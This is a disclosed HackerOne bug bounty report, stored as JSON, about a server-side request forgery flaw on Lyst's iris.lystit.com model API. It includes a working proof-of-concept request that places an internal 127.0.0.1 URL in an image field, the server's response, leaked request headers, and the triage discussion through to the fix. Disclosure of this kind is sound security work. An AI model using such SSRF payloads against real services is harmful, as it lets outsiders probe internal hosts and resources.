{"id":206894,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMDY4OTQ=","url":"https://hackerone.com/reports/206894","title":"SSRF at iris.lystit.com","state":"Closed","substate":"resolved","severity_rating":"low","readable_substate":"Resolved","created_at":"2017-02-16T14:13:21.528Z","submitted_at":"2017-02-16T14:13:21.528Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"tripwire","url":"/tripwire","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/121/835/432356390e8dc0810943b1efbb507782bb551f81_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":16334,"url":"https://hackerone.com/lyst","handle":"lyst","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/016/334/0915cf74d60a19ff359a42f4dfa3f9878957e589_original./3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/334/0915cf74d60a19ff359a42f4dfa3f9878957e589_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Lyst","twitter_handle":"makinglyst","website":"https://www.lyst.com","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2017-10-18T09:43:49.380Z","bug_reporter_agreed_on_going_public_at":"2017-09-18T09:43:33.880Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"###Server Side Request Forgery\n\n**Host**: `iris.lystit.com`\n**Route**: `/models`\n\n**Summary**\nThis vulnerability allows unauthenticated attacker to make arbitrary server-side HTTP GET requests, e.g. issue HTTP-requests to internal hosts and resources, limitedly scan ports, potentially bypass some restrictions for incoming requests, etc. \n\n\n###PoC\nReaching same REST application via local IP 127.0.0.1 at port 8080:\n\n```\nPOST /models/default/classification/color HTTP/1.1\nHost: iris.lystit.com\nAccept: application/json\nContent-Length: 111\nContent-Type: application/json\nConnection: close\n\n{\n    \"images\": [\"http://127.0.0.1:8080/static/rest_framework_swagger/images/wordnik_api.86c91314ec1a.png\"]\n}\n```\n\nResponse:\n```\nHTTP/1.1 200 OK\nAllow: POST, OPTIONS\nContent-Type: application/json\nDate: Thu, 16 Feb 2017 13:05:28 GMT\nVary: Cookie\nX-Frame-Options: SAMEORIGIN\nContent-Length: 76\nConnection: Close\n\n{\"data\":{\"color\":{\"probability\":\"0.903368339285\",\"id\":12,\"value\":\"orange\"}}}\n```\n\nRequesting attacker-controlled host leaks IP and these headers:\n\n```\nRequest: GET / HTTP/1.0\nConnection: close\nAccept-Encoding: gzip, deflate\nAccept: */*\nUser-Agent: python-requests/2.7.0 CPython/2.7.6 Linux/3.13.0-108-generic\nX-NewRelic-ID: VgQPVFBTGwIGXFdQDwAC\nX-NewRelic-Transaction: PxQEBwVQDQoEAldbVQMPXlBSFB8EBw8RVU4aUV5bBwcKUV9XCAMBWlwCVENKQQ8AUgdXUw9VFTs=\n```\n\n###Possible Mitigation Measures\n\nAdd whitelist to allow use of only trusted domains.","vulnerability_information_html":"\u003ch3 id=\"server-side-request-forgery\"\u003eServer Side Request Forgery\u003c/h3\u003e\n\n\u003cp\u003e\u003cstrong\u003eHost\u003c/strong\u003e: \u003ccode\u003eiris.lystit.com\u003c/code\u003e\u003cbr\u003e\n\u003cstrong\u003eRoute\u003c/strong\u003e: \u003ccode\u003e/models\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eSummary\u003c/strong\u003e\u003cbr\u003e\nThis vulnerability allows unauthenticated attacker to make arbitrary server-side HTTP GET requests, e.g. issue HTTP-requests to internal hosts and resources, limitedly scan ports, potentially bypass some restrictions for incoming requests, etc. \u003c/p\u003e\n\n\u003ch3 id=\"poc\"\u003ePoC\u003c/h3\u003e\n\n\u003cp\u003eReaching same REST application via local IP 127.0.0.1 at port 8080:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ePOST /models/default/classification/color HTTP/1.1\nHost: iris.lystit.com\nAccept: application/json\nContent-Length: 111\nContent-Type: application/json\nConnection: close\n\n{\n    \u0026quot;images\u0026quot;: [\u0026quot;http://127.0.0.1:8080/static/rest_framework_swagger/images/wordnik_api.86c91314ec1a.png\u0026quot;]\n}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eResponse:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eHTTP/1.1 200 OK\nAllow: POST, OPTIONS\nContent-Type: application/json\nDate: Thu, 16 Feb 2017 13:05:28 GMT\nVary: Cookie\nX-Frame-Options: SAMEORIGIN\nContent-Length: 76\nConnection: Close\n\n{\u0026quot;data\u0026quot;:{\u0026quot;color\u0026quot;:{\u0026quot;probability\u0026quot;:\u0026quot;0.903368339285\u0026quot;,\u0026quot;id\u0026quot;:12,\u0026quot;value\u0026quot;:\u0026quot;orange\u0026quot;}}}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eRequesting attacker-controlled host leaks IP and these headers:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eRequest: GET / HTTP/1.0\nConnection: close\nAccept-Encoding: gzip, deflate\nAccept: */*\nUser-Agent: python-requests/2.7.0 CPython/2.7.6 Linux/3.13.0-108-generic\nX-NewRelic-ID: VgQPVFBTGwIGXFdQDwAC\nX-NewRelic-Transaction: PxQEBwVQDQoEAldbVQMPXlBSFB8EBw8RVU4aUV5bBwcKUV9XCAMBWlwCVENKQQ8AUgdXUw9VFTs=\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch3 id=\"possible-mitigation-measures\"\u003ePossible Mitigation Measures\u003c/h3\u003e\n\n\u003cp\u003eAdd whitelist to allow use of only trusted domains.\u003c/p\u003e\n","bounty_amount":"100.0","formatted_bounty":"$100","weakness":{"id":68,"name":"Server-Side Request Forgery (SSRF)"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2017-10-18T09:43:33.932Z","allow_singular_disclosure_after":-100897911.88550903,"singular_disclosure_allowed":true,"vote_count":18,"voters":["jin","sameerphad72","jon_bottarini","mpz","r3y","khizer47","mr_r3boot","ak1t4","d33van","zerotoone","and 8 more..."],"severity":{"rating":"low","author_type":"Team"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1489244,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"This is a good find thank you. This service was unintentionally setup publically instead of in our usual private environment.","markdown_message":"\u003cp\u003eThis is a good find thank you. This service was unintentionally setup publically instead of in our usual private environment.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-02-16T14:21:51.574Z","updated_at":"2017-02-16T14:21:51.574Z","actor":{"username":"alexs","cleared":false,"url":"/alexs","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"lyst","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1497679,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2017-02-21T20:25:26.285Z","updated_at":"2017-02-21T20:25:26.285Z","additional_data":{"old_severity":"Medium","new_severity":"Low","old_severity_id":26272,"new_severity_id":27095},"actor":{"username":"iserko","cleared":false,"url":"/iserko","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/135/036/39b2ca36595f9cb4a40f97505dd4ab14e123d80a_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"lyst","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1497682,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"@tripwire thanks for the report, I dropped the severity because the application is an internal service which has little effect on actual user data and as @alexs mentioned it was never supposed to be public.","markdown_message":"\u003cp\u003e\u003ca href=\"/tripwire\"\u003e@tripwire\u003c/a\u003e thanks for the report, I dropped the severity because the application is an internal service which has little effect on actual user data and as \u003ca href=\"/alexs\"\u003e@alexs\u003c/a\u003e mentioned it was never supposed to be public.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-02-21T20:26:58.612Z","updated_at":"2017-02-21T20:26:58.612Z","actor":{"username":"iserko","cleared":false,"url":"/iserko","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/135/036/39b2ca36595f9cb4a40f97505dd4ab14e123d80a_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"lyst","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1497683,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2017-02-21T20:27:10.253Z","updated_at":"2017-02-21T20:27:10.253Z","actor":{"url":"/lyst","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/334/0915cf74d60a19ff359a42f4dfa3f9878957e589_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Lyst"}},"bounty_amount":"100.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"lyst","collaborator":{"username":"tripwire","url":"/tripwire"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1497684,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@tripwire the service should now be unreachable. Can you verify?","markdown_message":"\u003cp\u003e\u003ca href=\"/tripwire\"\u003e@tripwire\u003c/a\u003e the service should now be unreachable. Can you verify?\u003c/p\u003e\n","automated_response":false,"created_at":"2017-02-21T20:27:39.011Z","updated_at":"2017-02-21T20:27:39.011Z","actor":{"username":"iserko","cleared":false,"url":"/iserko","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/135/036/39b2ca36595f9cb4a40f97505dd4ab14e123d80a_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"lyst","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1498830,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"It's fixed. Server is no longer accessible and domain name isn't resolvable.\n\u003ethe application is an internal service \n\u003eit was never supposed to be public\n\nThat's exactly why I used `Medium` severity. Unintentionally published internal services (even safe ones) usually pose a great threat.","markdown_message":"\u003cp\u003eIt\u0026#39;s fixed. Server is no longer accessible and domain name isn\u0026#39;t resolvable.\u003c/p\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003ethe application is an internal service \u003cbr\u003e\nit was never supposed to be public\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eThat\u0026#39;s exactly why I used \u003ccode\u003eMedium\u003c/code\u003e severity. Unintentionally published internal services (even safe ones) usually pose a great threat.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-02-22T10:06:57.565Z","updated_at":"2017-02-22T10:06:57.565Z","actor":{"username":"tripwire","cleared":false,"url":"/tripwire","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/121/835/432356390e8dc0810943b1efbb507782bb551f81_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"lyst","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1536829,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Obviously I can't possibly know if there was something critical accessible through that server. ","markdown_message":"\u003cp\u003eObviously I can\u0026#39;t possibly know if there was something critical accessible through that server. \u003c/p\u003e\n","automated_response":false,"created_at":"2017-03-13T09:10:31.964Z","updated_at":"2017-03-13T09:10:31.964Z","actor":{"username":"tripwire","cleared":false,"url":"/tripwire","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/121/835/432356390e8dc0810943b1efbb507782bb551f81_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"lyst","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1536831,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Is there any specific reason this isn't marked as `Resolved` yet? ","markdown_message":"\u003cp\u003eIs there any specific reason this isn\u0026#39;t marked as \u003ccode\u003eResolved\u003c/code\u003e yet? \u003c/p\u003e\n","automated_response":false,"created_at":"2017-03-13T09:10:47.108Z","updated_at":"2017-03-13T09:10:47.108Z","actor":{"username":"tripwire","cleared":false,"url":"/tripwire","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/121/835/432356390e8dc0810943b1efbb507782bb551f81_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"lyst","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1536844,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2017-03-13T09:17:32.521Z","updated_at":"2017-03-13T09:17:32.521Z","actor":{"username":"lystmatt","cleared":false,"url":"/lystmatt","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"tripwire","url":"/tripwire"},"genius_execution_id":null,"team_handle":"lyst","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2002990,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-09-18T09:43:33.903Z","updated_at":"2017-09-18T09:43:33.903Z","first_to_agree":true,"actor":{"username":"tripwire","cleared":false,"url":"/tripwire","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/121/835/432356390e8dc0810943b1efbb507782bb551f81_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"lyst","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2077378,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-10-18T09:43:49.399Z","updated_at":"2017-10-18T09:43:49.399Z","actor":{"url":"/lyst","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/334/0915cf74d60a19ff359a42f4dfa3f9878957e589_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Lyst"}},"genius_execution_id":null,"team_handle":"lyst","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}